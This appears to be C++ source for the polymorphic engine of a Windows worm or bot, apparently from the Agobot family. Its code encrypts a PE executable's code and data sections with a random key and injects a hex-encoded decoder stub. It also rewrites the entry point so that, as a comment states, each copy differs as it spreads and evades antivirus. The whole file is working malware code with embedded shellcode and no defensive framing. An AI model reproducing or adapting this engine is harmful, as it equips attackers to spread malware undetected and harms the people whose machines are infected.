

#include "main.h"
#include "polymorph.h"
#include "random.h"

#ifdef WIN32

//
// Compile agoenc.asm with nasm and convert it to a .h file using
// makeshell.exe to get this. It may be that you have to change the
// offsets if you modify something before the data section, like the
// DLL loader.
//

char agoenc[]=
	"\xE9\x55\x00\x00\x00\x5A\x56\x57\x50\x51\x53\x89\xD3\xE8\x48"
	"\x01\x00\x00\x8D\xB3\x2C\x00\x00\x00\x8D\xBB\x35\x00\x00\x00\xC7"
	"\x83\x78\x00\x00\x00\x0F\x00\x00\x00\xE8\xC0\x00\x00\x00\x89\x83"
	"\x55\x00\x00\x00\x8D\xBB\x44\x00\x00\x00\xC7\x83\x78\x00\x00\x00"
	"\x0D\x00\x00\x00\xE8\xA5\x00\x00\x00\x89\x83\x51\x00\x00\x00\x53"
	"\xE8\x7E\x01\x00\x00\x5B\x5B\x59\x58\x5F\x5E\xE8\xA6\xFF\xFF\xFF"
	"\x00\x00\x00\x00\x11\x11\x11\x11\x22\x22\x22\x22\x33\x33\x33\x33"
	"\xFF\xFF\xFF\xFF\x44\x44\x44\x44\x55\x55\x55\x55\x66\x66\x66\x66"
	"\x77\x77\x77\x77\x00\x00\x00\x00\x00\x00\x00\x00\x6B\x65\x72\x6E"
	"\x65\x6C\x33\x32\x00\x47\x65\x74\x50\x72\x6F\x63\x41\x64\x64\x72"
	"\x65\x73\x73\x00\x4C\x6F\x61\x64\x4C\x69\x62\x72\x61\x72\x79\x41"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x77\x2B\x62\x00\x72\x62\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x51\x57\x56\x56"
	"\xFF\x53\x51\x50\x59\x57\x51\xFF\x53\x55\x5E\x5F\x59\xC3\x31\xC0"
	"\x89\x43\x74\x8B\x53\x74\x3B\x53\x64\x7D\x48\x42\x89\x53\x74\x31"
	"\xC0\x8B\x43\x74\xC1\xE0\x02\x8B\x4B\x6C\x01\xC1\x8B\x01\x03\x43"
	"\x60\x57\x56\x51\x89\xFE\x89\xC7\x8B\x4B\x78\xF3\xA6\x59\x5E\x5F"
	"\x75\xD1\x31\xC0\x8B\x43\x74\xD1\xE0\x8B\x4B\x70\x01\xC1\x31\xC0"
	"\x66\x8B\x01\xC1\xE0\x02\x8B\x4B\x68\x01\xC8\x8B\x08\x03\x4B\x60"
	"\x89\xC8\xC3\x31\xC0\xC3\xA1\x00\x00\x00\x00\x3E\x8B\x40\x34\x3E"
	"\x8B\xA8\xB8\x00\x00\x00\xE9\x0E\x00\x00\x00\x50\x51\x56\x55\x64"
	"\xA1\x30\x00\x00\x00\x85\xC0\x78\xE2\x3E\x8B\x40\x0C\x3E\x8B\x70"
	"\x1C\xAD\x3E\x8B\x68\x08\x89\x6B\x60\x89\xE8\x66\x81\x38\x4D\x5A"
	"\x75\xC4\x05\x3C\x00\x00\x00\x8B\x08\x03\x4B\x60\x66\x81\x39\x50"
	"\x45\x75\xB3\x81\xC1\x78\x00\x00\x00\x8B\x31\x03\x73\x60\x81\xC6"
	"\x18\x00\x00\x00\xAD\x89\x43\x64\xAD\x03\x43\x60\x89\x43\x68\xAD"
	"\x03\x43\x60\x89\x43\x6C\xAD\x03\x43\x60\x89\x43\x70\x5D\x5E\x59"
	"\x58\xC3\x8B\x4B\x14\x8B\x53\x24\x01\xCA\x5B\x5B\x5B\x59\x58\x5F"
	"\x5E\xFF\xE2\x8B\x4B\x28\x81\xF9\x01\x00\x00\x00\x74\xE4\x89\xD9"
	"\x2B\x4B\x04\x66\x31\xC9\x89\x4B\x24\x03\x4B\x08\x89\xCE\x8B\x4B"
	"\x0C\x31\xD2\x8B\x43\x10\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x8B\x4B\x24\x03\x4B\x1C\x89\xCE\x8B\x4B"
	"\x20\x31\xD2\x8B\x43\x10\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\xC7\x43\x28\x01\x00\x00\x00\x8B\x4B\x14"
	"\x8B\x53\x24\x01\xCA\x5B\x5B\x5B\x59\x58\x5F\x5E\x89\x54\x24\x34"
	"\xFF\xE2";

// List of encoders/decoders
// Comments are encoders, assembler pieces are decoders

// rotate right:
// *(unsigned long*)output = *(unsigned long*)input;
// *(unsigned long*)output = (*(unsigned long*)output>>1)|(*(unsigned long*)output<<31);
char rolloop[]=
	"\xD1\x04\x16\x81\xC2\x04\x00\x00\x00\x39\xCA\x7C\xF3";

// rotate left:
// *(unsigned long*)output = *(unsigned long*)input;
// *(unsigned long*)output = (*(unsigned long*)output<<1)|(*(unsigned long*)output>>31);
char rorloop[]=
	"\xD1\x0C\x16\x81\xC2\x04\x00\x00\x00\x39\xCA\x7C\xF3";

// swap words:
// *(unsigned short*)output = *(unsigned short*)input+2;
// *(unsigned short*)output+2 = *(unsigned short*)input;
char swaploop[]=
	"\x53\x66\x8B\x1C\x16\x66\x8B\x7C\x16\x02\x66\x89\x3C\x16\x66"
	"\x89\x5C\x16\x02\x5B\x81\xC2\x04\x00\x00\x00\x39\xCA\x7C\xE2";

// xor:
// *(unsigned long*)output = *(unsigned long*)input ^ (unsigned long)key;
char xorloop[]=
	"\x31\x04\x16\x81\xC2\x04\x00\x00\x00\x39\xCA\x7C\xF3";

char xorloop2[]=
	"\x31\x04\x16\x81\xC2\x01\x00\x00\x00\x81\xC2\x02\x00\x00\x00"
	"\x81\xEA\x01\x00\x00\x00\x81\xEA\x01\x00\x00\x00\x81\xC2\x03\x00"
	"\x00\x00\x52\x51\x59\x5A\x39\xCA\x7C\xD7";

char xorloop3[]=
	"\xD1\xC0\xD1\xC8\x50\x31\xC0\x58\x31\x04\x16\x81\xC2\x06\x00"
	"\x00\x00\x81\xEA\x02\x00\x00\x00\x39\xCA\x7C\xE5";

//
// Defines for all the polytypes
//

#define POLY_TYPE_UNKNOWN	0
#define POLY_TYPE_XOR		1
#define POLY_TYPE_SWAP		2
#define POLY_TYPE_ROR		3
#define POLY_TYPE_ROL		4
#define POLY_NUM_TYPES		4

//
// To get these offsets, open agoenc.s with Win32Dasm and search for the
// Start of the data section, then check with the code that you are really
// at the right location and note the value in the statusbar for offset in
// file. This will be the offset for the line selected in Win32Dasm.
//

#define ENC_OFFSET_OFFSET		0x63
#define ENC_OFFSET_OFFSET_CODE	0x67
#define ENC_OFFSET_CODE_SIZE	0x6B
#define ENC_OFFSET_KEY			0x6F
#define ENC_OFFSET_ENTRYPOINT	0x73
#define ENC_OFFSET_TYPE			0x77
#define ENC_OFFSET_OFFSET_DATA	0x7B
#define ENC_OFFSET_DATA_SIZE	0x7F
#define ENC_OFFSET_DECODER		0x1F5
#define ENC_OFFSET_DECODER_DATA	0x285

//
// Global polymorph object for testing without recompilation
//

extern char *g_szSectionName;

#ifdef DBGCONSOLE
void AddLog(const char *szFormat, ...)
{	if(!szFormat) return;
	va_list va_alist; char formatbuf[8192]; va_start(va_alist, szFormat);
	vsnprintf(formatbuf, sizeof(formatbuf), szFormat, va_alist); va_end(va_alist);
	FILE *fp=fopen("d:\\poly.log", "a"); if(!fp) return;
	fprintf(fp, "%s", formatbuf); fclose(fp); }
#endif // _DEBUG

// ATTENTION !!! TESTING CODE !!! ATTENTION

CPolymorph::CPolymorph() { }

CPolymorph::CPolymorph(const char *szFile, const char *szOutFile) {
//	DoPolymorph(szFile, szOutFile);
}

CPolymorph::~CPolymorph() { }

//
// DoPolymorph
// This maps the file, searches the sections for an encoder suitable
// section and a code section, builds an encoder into the section,
// sets the entry point in the file to the encoder, sets a flag in the
// header to detect already encryted files and finally saves the file
// back to disk. This is used to morph the file each time it spreads
// to evade antivirus, cause the avs have to spread it each time they
// want a new version of the morhped program.
//

bool CPolymorph::DoPolymorph(const char *szFile, const char *szOutFile) {
	// Map the file into memory
	char *szBuffer; if(!MapFile(szFile, &szBuffer)) return false;

#ifdef DBGCONSOLE
	AddLog("Polymorphing file \"%s\" to \"%s\"...\n", szFile, szOutFile);
#endif // DBGCONSOLE

	// Get and check the DOS header
	IMAGE_DOS_HEADER *iDosHeader=(IMAGE_DOS_HEADER*)szBuffer;
	if(iDosHeader->e_magic!=IMAGE_DOS_SIGNATURE) { UnmapFile(); return false; }

	// Get and check the PE header
	char *pTemp=(char*)iDosHeader+iDosHeader->e_lfanew;
	DWORD *dwSignature=(DWORD*)pTemp; pTemp+=sizeof(DWORD);
	if(*dwSignature!=IMAGE_NT_SIGNATURE) { UnmapFile(); return false; }

	// Get the rest of the headers
	IMAGE_FILE_HEADER *iFileHead=(IMAGE_FILE_HEADER*)pTemp; pTemp+=sizeof(IMAGE_FILE_HEADER);
	IMAGE_OPTIONAL_HEADER *iOptHead=(IMAGE_OPTIONAL_HEADER*)pTemp; pTemp+=sizeof(IMAGE_OPTIONAL_HEADER);
	IMAGE_SECTION_HEADER *iSectHead=(IMAGE_SECTION_HEADER*)pTemp;

	// Get the size of the encoder
	int iEncoderSize=sizeof(agoenc);

#ifdef DBGCONSOLE
	AddLog(" - sizeof Encoder:  0x%8.8X\n", iEncoderSize);
#endif // DBGCONSOLE

	// Loop through the section headers
	int iSection; IMAGE_SECTION_HEADER *iSectPtr, *iSectEnc=NULL, *iSectCode=NULL, *iSectData=NULL;
	for(iSection=0, iSectPtr=iSectHead; iSection<iFileHead->NumberOfSections; iSection++, iSectPtr++) {
		// Check if its g_szSectionName (the internal section where
		// the encoder is stored).
		if(strstr((char*)iSectPtr->Name, g_szSectionName)) {
			// Store encoder in this section
			if(iSectPtr->SizeOfRawData >= iEncoderSize)
				iSectEnc=iSectPtr;
		}
		// Check if its the code section
		if(strstr((char*)iSectPtr->Name, ".text")) {
			// Mark this as the code section
			iSectCode=iSectPtr;
		}
		// Check if its the data section
		if(strstr((char*)iSectPtr->Name, ".data")) {
			// Mark this as the data section
			iSectData=iSectPtr;
		}
	}

#ifdef DBGCONSOLE
	AddLog(" - Encoder section: 0x%8.8X\n", iSectEnc);
	AddLog(" - Code section:    0x%8.8X\n", iSectCode);
	AddLog(" - Data section:    0x%8.8X\n", iSectData);
#endif // DBGCONSOLE

	// The .exe file is already encrypted
	while(iFileHead->TimeDateStamp==0xFFFFFFFF) {
#ifdef DBGCONSOLE
		AddLog(" - File is already encryped, decrypting...\n");
#endif // DBGCONSOLE

		// Get values out of the header
		char *pSectionData=(char*)szBuffer+iSectEnc->PointerToRawData;
		int iSectionSize=iSectEnc->SizeOfRawData;

		// Get the key
		unsigned long lKey, lType, lEntry;
		memcpy(&lKey,	szBuffer+iSectEnc->PointerToRawData+ENC_OFFSET_KEY,			sizeof(unsigned long)); 
		memcpy(&lType,	szBuffer+iSectEnc->PointerToRawData+ENC_OFFSET_TYPE,		sizeof(unsigned long)); 
		memcpy(&lEntry,	szBuffer+iSectEnc->PointerToRawData+ENC_OFFSET_ENTRYPOINT,	sizeof(unsigned long)); 

		// Allocate memory for the new section data
		char *pNewSectionData=(char*)malloc(iSectionSize+1);
		if(!pNewSectionData) break;

		// DeXOR the code section
		unsigned char *pCodeData=
			(unsigned char*)szBuffer+iSectCode->PointerToRawData;

		switch(lType)
		{
		case POLY_TYPE_XOR:
			{	// XOR to decrypt
				for(int i=0;i<iSectCode->SizeOfRawData;i+=4)
					*(unsigned long*)(pCodeData+i)^=lKey; }
			break;
		case POLY_TYPE_SWAP:
			{	// SWAP to decrypt
				for(int i=0;i<iSectCode->SizeOfRawData;i+=4)
				{	unsigned short word1=*(unsigned short*)(pCodeData+i);
					unsigned short word2=*(unsigned short*)(pCodeData+i+2);
					*(unsigned short*)(pCodeData+i)=word2;
					*(unsigned short*)(pCodeData+i+2)=word1; } }
			break;
		case POLY_TYPE_ROR:
			{	// ROL to decrypt
				for(int i=0;i<iSectCode->SizeOfRawData;i+=4)
				{	unsigned long lInput=*(unsigned long*)(pCodeData+i);
					*(unsigned long*)(pCodeData+i)=(lInput<<1)|(lInput>>31); } }
			break;
		case POLY_TYPE_ROL:
			{	// ROR to decrypt
				for(int i=0;i<iSectCode->SizeOfRawData;i+=4)
				{	unsigned long lInput=*(unsigned long*)(pCodeData+i);
					*(unsigned long*)(pCodeData+i)=(lInput>>1)|(lInput<<31); } }
			break;
		default:
			break;
		};

		// DeXOR the data section
		unsigned char *pDataData=
			(unsigned char*)szBuffer+iSectData->PointerToRawData;

		switch(lType)
		{
		case POLY_TYPE_XOR:
			{	// XOR to decrypt
				for(int i=0;i<iSectData->SizeOfRawData;i+=4)
					*(unsigned long*)(pDataData+i)^=lKey; }
			break;
		case POLY_TYPE_SWAP:
			{	// SWAP to decrypt
				for(int i=0;i<iSectData->SizeOfRawData;i+=4)
				{	unsigned short word1=*(unsigned short*)(pDataData+i);
					unsigned short word2=*(unsigned short*)(pDataData+i+2);
					*(unsigned short*)(pDataData+i)=word2;
					*(unsigned short*)(pDataData+i+2)=word1; } }
			break;
		case POLY_TYPE_ROR:
			{	// ROL to decrypt
				for(int i=0;i<iSectData->SizeOfRawData;i+=4)
				{	unsigned long lInput=*(unsigned long*)(pDataData+i);
					*(unsigned long*)(pDataData+i)=(lInput<<1)|(lInput>>31); } }
			break;
		case POLY_TYPE_ROL:
			{	// ROR to decrypt
				for(int i=0;i<iSectData->SizeOfRawData;i+=4)
				{	unsigned long lInput=*(unsigned long*)(pDataData+i);
					*(unsigned long*)(pDataData+i)=(lInput>>1)|(lInput<<31); } }
			break;
		default:
			break;
		};

		// Set the entry point to the old entry
		memcpy(&iOptHead->AddressOfEntryPoint, &lEntry, sizeof(lEntry));

		// Copy the section data into the image
		memcpy(pSectionData, pNewSectionData, iSectionSize);
		free(pNewSectionData); break; }

	// Found an encoder-suitable section
	while(iSectEnc && iSectCode && iSectData) {
		// Get values out of the header
		char *pSectionData=(char*)szBuffer+iSectEnc->PointerToRawData;
		int iSectionSize=iSectEnc->SizeOfRawData;

		// Get a key
		init_random(); unsigned long lKey;
		*((char*)&lKey+0)=brandom(1,254); *((char*)&lKey+1)=brandom(1,254);
		*((char*)&lKey+2)=brandom(1,254); *((char*)&lKey+3)=brandom(1,254);

#ifdef DBGCONSOLE
		AddLog(" - Encryption key:  0x%8.8X...\n", lKey);
#endif // DBGCONSOLE

		// Get a type
		unsigned long lType=brandom(1,POLY_NUM_TYPES);

		// Set some marker for encryption detection later
		iFileHead->TimeDateStamp=0xFFFFFFFF;

		// Allocate memory for the new section data
		char *pNewSectionData=(char*)malloc(iSectionSize+1);
		if(!pNewSectionData) break;

		// Build an encoder in the section data
		BuildEncoder(pNewSectionData, iSectionSize, iSectEnc->VirtualAddress, \
			iSectCode->VirtualAddress, iSectCode->SizeOfRawData, \
			iSectData->VirtualAddress, iSectData->SizeOfRawData, \
			iOptHead->AddressOfEntryPoint, lKey, lType);

		// Set the entry point to the virtual address of the encoder section
		memcpy(&iOptHead->AddressOfEntryPoint, &iSectEnc->VirtualAddress, \
			sizeof(iSectEnc->VirtualAddress));

		// Make the encoder section readable, writable, executable,
		// and containing code
		iSectEnc->Characteristics	=	IMAGE_SCN_MEM_EXECUTE |
										IMAGE_SCN_MEM_READ |
										IMAGE_SCN_MEM_WRITE |
										IMAGE_SCN_CNT_CODE;

		// Make the code section readable, writable, executable,
		// and containing code
		iSectCode->Characteristics	=	IMAGE_SCN_MEM_EXECUTE |
										IMAGE_SCN_MEM_READ |
										IMAGE_SCN_MEM_WRITE |
										IMAGE_SCN_CNT_CODE;

		// Make the data section readable, writable and containing inited data
		iSectData->Characteristics	=	IMAGE_SCN_MEM_READ |
										IMAGE_SCN_MEM_WRITE |
										IMAGE_SCN_CNT_INITIALIZED_DATA;

		// XOR the code section
		unsigned char *pCodeData=
			(unsigned char*)szBuffer+iSectCode->PointerToRawData;

		switch(lType)
		{
		case POLY_TYPE_XOR:
			{
#ifdef DBGCONSOLE
				AddLog(" - Code: Using XOR encoding...\n", lKey);
#endif // DBGCONSOLE
				// XOR to encrypt
				for(int i=0;i<iSectCode->SizeOfRawData;i+=4)
					*(unsigned long*)(pCodeData+i)^=lKey; }
			break;
		case POLY_TYPE_SWAP:
			{	
#ifdef DBGCONSOLE
				AddLog(" - Code: Using Word swap encoding...\n", lKey);
#endif // DBGCONSOLE
				// SWAP to encrypt
				for(int i=0;i<iSectCode->SizeOfRawData;i+=4)
				{	unsigned short word1=*(unsigned short*)(pCodeData+i);
					unsigned short word2=*(unsigned short*)(pCodeData+i+2);
					*(unsigned short*)(pCodeData+i)=word2;
					*(unsigned short*)(pCodeData+i+2)=word1; } }
			break;
		case POLY_TYPE_ROR:
			{	
#ifdef DBGCONSOLE
				AddLog(" - Code: Using bitwise right rotate encoding...\n", lKey);
#endif // DBGCONSOLE
				// ROR to encrypt
				for(int i=0;i<iSectCode->SizeOfRawData;i+=4)
				{	unsigned long lInput=*(unsigned long*)(pCodeData+i);
					*(unsigned long*)(pCodeData+i)=(lInput>>1)|(lInput<<31); } }
			break;
		case POLY_TYPE_ROL:
			{	
#ifdef DBGCONSOLE
				AddLog(" - Code: Using bitwise left rotate encoding...\n", lKey);
#endif // _DEBUG
				// ROL to encrypt
				for(int i=0;i<iSectCode->SizeOfRawData;i+=4)
				{	unsigned long lInput=*(unsigned long*)(pCodeData+i);
					*(unsigned long*)(pCodeData+i)=(lInput<<1)|(lInput>>31); } }
			break;
		default:
			break;
		};
		
		// XOR the data section
		unsigned char *pDataData=
			(unsigned char*)szBuffer+iSectData->PointerToRawData;

		switch(lType)
		{
		case POLY_TYPE_XOR:
			{
#ifdef DBGCONSOLE
				AddLog(" - Data: Using XOR encoding...\n", lKey);
#endif // _DEBUG
				// XOR to encrypt
				for(int i=0;i<iSectData->SizeOfRawData;i+=4)
					*(unsigned long*)(pDataData+i)^=lKey; }
			break;
		case POLY_TYPE_SWAP:
			{	
#ifdef DBGCONSOLE
				AddLog(" - Data: Using Word swap encoding...\n", lKey);
#endif // _DEBUG
				// SWAP to encrypt
				for(int i=0;i<iSectData->SizeOfRawData;i+=4)
				{	unsigned short word1=*(unsigned short*)(pDataData+i);
					unsigned short word2=*(unsigned short*)(pDataData+i+2);
					*(unsigned short*)(pDataData+i)=word2;
					*(unsigned short*)(pDataData+i+2)=word1; } }
			break;
		case POLY_TYPE_ROR:
			{	
#ifdef DBGCONSOLE
				AddLog(" - Data: Using bitwise right rotate encoding...\n", lKey);
#endif // _DEBUG
				// ROR to encrypt
				for(int i=0;i<iSectData->SizeOfRawData;i+=4)
				{	unsigned long lInput=*(unsigned long*)(pDataData+i);
					*(unsigned long*)(pDataData+i)=(lInput>>1)|(lInput<<31); } }
			break;
		case POLY_TYPE_ROL:
			{	
#ifdef DBGCONSOLE
				AddLog(" - Data: Using bitwise left rotate encoding...\n", lKey);
#endif // _DEBUG
				// ROL to encrypt
				for(int i=0;i<iSectData->SizeOfRawData;i+=4)
				{	unsigned long lInput=*(unsigned long*)(pDataData+i);
					*(unsigned long*)(pDataData+i)=(lInput<<1)|(lInput>>31); } }
			break;
		default:
			break;
		};

		// Copy the section data into the image
		memcpy(pSectionData, pNewSectionData, iSectionSize);
		free(pNewSectionData); break; }

	// Save the file under a new filename and unmap it
	SaveFile(szOutFile); UnmapFile(); return true; }

//
// BuildEncoder
// Setup a new encoder in the memory given as parameter
//
void CPolymorph::BuildEncoder(char *szSectionData, int iSectionSize, DWORD dwOffset, DWORD dwOffsetCode, DWORD dwCodeSize, DWORD dwOffsetData, DWORD dwDataSize, DWORD dwEntryPoint, unsigned long lKey, unsigned long lType) {
	// Clear the section and copy the encoder into it
	memset(szSectionData,										0,				iSectionSize		);
	memcpy(szSectionData,										agoenc,			sizeof(agoenc)-1	);

	switch(lType)
	{
	case POLY_TYPE_XOR:
		{	int iXORLoopNum=brandom(1,3);
			switch(iXORLoopNum)
			{
			case 1:
#ifdef DBGCONSOLE
				AddLog(" - XOR decoder:     xorloop\n");
#endif // _DEBUG
				memcpy(szSectionData+ENC_OFFSET_DECODER,		xorloop,		sizeof(xorloop)-1	);
				memcpy(szSectionData+ENC_OFFSET_DECODER_DATA,	xorloop,		sizeof(xorloop)-1	);
				break;
			case 2:
#ifdef DBGCONSOLE
				AddLog(" - XOR decoder:     xorloop2\n");
#endif // _DEBUG
				memcpy(szSectionData+ENC_OFFSET_DECODER,		xorloop2,		sizeof(xorloop2)-1	);
				memcpy(szSectionData+ENC_OFFSET_DECODER_DATA,	xorloop2,		sizeof(xorloop2)-1	);
				break;
			case 3:
#ifdef DBGCONSOLE
				AddLog(" - XOR decoder:     xorloop3\n");
#endif // _DEBUG
				memcpy(szSectionData+ENC_OFFSET_DECODER,		xorloop3,		sizeof(xorloop3)-1	);
				memcpy(szSectionData+ENC_OFFSET_DECODER_DATA,	xorloop3,		sizeof(xorloop3)-1	);
				break;
			default:
				break; } }
		break;
	case POLY_TYPE_SWAP:
#ifdef DBGCONSOLE
		AddLog(" - Swap decoder:    swaploop\n");
#endif // _DEBUG
		memcpy(szSectionData+ENC_OFFSET_DECODER,				swaploop,		sizeof(swaploop)-1	);
		memcpy(szSectionData+ENC_OFFSET_DECODER_DATA,			swaploop,		sizeof(swaploop)-1	);
		break;
	case POLY_TYPE_ROR:
#ifdef DBGCONSOLE
		AddLog(" - ROR decoder:     rolloop\n");
#endif // _DEBUG
		memcpy(szSectionData+ENC_OFFSET_DECODER,				rolloop,		sizeof(rolloop)-1	);
		memcpy(szSectionData+ENC_OFFSET_DECODER_DATA,			rolloop,		sizeof(rolloop)-1	);
		break;
	case POLY_TYPE_ROL:
#ifdef DBGCONSOLE
		AddLog(" - ROL decoder:     rorloop\n");
#endif // _DEBUG
		memcpy(szSectionData+ENC_OFFSET_DECODER,				rorloop,		sizeof(rorloop)-1	);
		memcpy(szSectionData+ENC_OFFSET_DECODER_DATA,			rorloop,		sizeof(rorloop)-1	);
		break;
	default:
		break;
	};

//	dwDataSize+=0x1000; // FIXME: Bad Hack

	// Configure the encoder
	memcpy(szSectionData+ENC_OFFSET_OFFSET,						&dwOffset,		sizeof(unsigned long));
	memcpy(szSectionData+ENC_OFFSET_OFFSET_CODE,				&dwOffsetCode,	sizeof(unsigned long));
	memcpy(szSectionData+ENC_OFFSET_CODE_SIZE,					&dwCodeSize,	sizeof(unsigned long));
	memcpy(szSectionData+ENC_OFFSET_OFFSET_DATA,				&dwOffsetData,	sizeof(unsigned long));
	memcpy(szSectionData+ENC_OFFSET_DATA_SIZE,					&dwDataSize,	sizeof(unsigned long));
	memcpy(szSectionData+ENC_OFFSET_KEY,						&lKey,			sizeof(unsigned long));
	memcpy(szSectionData+ENC_OFFSET_ENTRYPOINT,					&dwEntryPoint,	sizeof(unsigned long));
	memcpy(szSectionData+ENC_OFFSET_TYPE,						&lType,			sizeof(unsigned long));
}		

//
// MapFile
// This creates a memory mapped file
//

int CPolymorph::MapFile(const char *szFile, char **szBuffer) {
	// Try to open the file
	FILE *fp=fopen(szFile, "rb"); if(!fp) return 0;
	// Get the file size
	fseek(fp, 0, SEEK_END); int iFileSize=(int)ftell(fp); fseek(fp, 0, SEEK_SET);
	// Allocate the memory for the mapping
	*szBuffer=(char*)malloc(iFileSize); if(!*szBuffer) { fclose(fp); return 0; }
	// Read the file into memory
	if(fread(*szBuffer, sizeof(char), iFileSize, fp)<iFileSize) { fclose(fp); return 0; }
	// Copy values to the corresponding member variables and close the file
	m_iFileSize=iFileSize; m_szBuffer=*szBuffer; fclose(fp); return iFileSize; }

//
// UnmapFile
// This unmaps the memory mapped file
//

void CPolymorph::UnmapFile() {
	// Free the memory for the file
	free(m_szBuffer); }

//
// SaveFile
// This saves the memory mapped file back to disk
//

void CPolymorph::SaveFile(const char *szFile) {
	// Open the new file
	FILE *fp=fopen(szFile, "w+b"); if(!fp) return;
	// Write the mapped memory to the file
	fwrite(m_szBuffer, sizeof(char), m_iFileSize, fp);
	// Close the file
	fclose(fp); }

#endif // WIN32
